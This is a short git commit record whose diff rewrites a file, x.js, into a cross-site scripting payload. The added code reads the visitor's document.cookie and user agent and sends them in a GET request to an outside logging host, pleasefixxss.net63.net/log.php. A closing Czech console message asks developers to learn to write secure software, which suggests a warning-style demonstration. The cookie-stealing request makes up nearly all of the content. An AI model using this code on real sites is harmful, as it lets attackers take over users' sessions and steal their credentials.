16d0d69b9c28b055391ba9c5a565d869cc9eebd1
Testerino <honzaik@yahoo.com>
2014-04-17 00:22:08 +0200

    Update x.js
    idk

--- x.js
+++ x.js
@@ -1,2 +1,13 @@
-console.log(document.cookie);
-console.log(navigator.userAgent);
+var cookies = document.cookie;
+var userAgent = navigator.userAgent;
+var params = "?cookies=" + cookies + "&agent=" + userAgent;
+var xhr = new XMLHttpRequest();
+
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+        alert(xhr.responseText);
+    }
+}
+xhr.open('GET', 'http://pleasefixxss.net63.net/log.php' + params, true);
+xhr.send(null);
+console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpeční software. děkuji");
